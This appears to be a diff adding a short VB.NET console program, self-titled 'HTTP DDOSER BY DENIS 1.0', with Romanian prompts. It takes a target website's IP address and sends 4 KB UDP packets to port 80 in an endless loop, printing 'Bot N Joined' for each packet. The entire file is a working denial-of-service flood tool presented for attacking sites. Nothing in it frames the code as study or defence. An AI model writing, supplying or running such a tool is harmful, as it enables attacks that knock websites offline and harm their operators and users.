@@ -1,0 +1,35 @@
+Imports System.Net, System.Net.Sockets
+Module Module1
+    Sub Main()
+        Dim IP As String
+        Dim Port As Integer = 80
+        Dim sentt As Integer
+        Dim synthesizer = CreateObject("SAPI.spvoice")
+        Console.SetWindowSize(50, 50)
+        Console.Title = "HTTP DDOSER BY DENIS 1.0"
+        Console.ForegroundColor = ConsoleColor.DarkGreen
+        Console.WriteLine("#########################CREATED BY DENIS################################## ")
+        Console.WriteLine("#########################HTTP ATACK V1.0################################## ")
+        Console.WriteLine("=============================================================================")
+        Console.WriteLine("ATENTIE! FUNCTIONEAZA DOAR CU IP-UL SITE-ULUI. DECI DACA SCRIETI EXEMPLU.COM NU VA FUNCTIONA.")
+        Console.Write("IP SITE: : ")
+        synthesizer.Speak("Atack started..")
+        IP = Console.ReadLine
+        Dim remoteEP As New IPEndPoint(IPAddress.Parse(IP), Port)
+        Dim buffer As Byte() = New Byte(&H1000 - 1) {}
+        Dim socket As New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
+        Console.WriteLine("****************************************************************************")
+        Console.WriteLine(String.Concat(New Object() {"Se ataca : ", IP, ":", Port, " - ", DateTime.Now.ToString("MM/dd/yyyy h:mm tt")}))
+        Console.WriteLine("****************************************************************************")
+        Console.WriteLine("Apasa orice tasta pentru a continua...")
+        synthesizer.Speak("Atack started..")
+        Console.ReadLine()
+        Do While True
+            sentt += 1
+            Console.WriteLine(("Bot " & sentt & " Joined"))
+            socket.SendTo(buffer, remoteEP)
+            Threading.Thread.Sleep(&H2D)
+        Loop
+    End Sub
+
+End Module
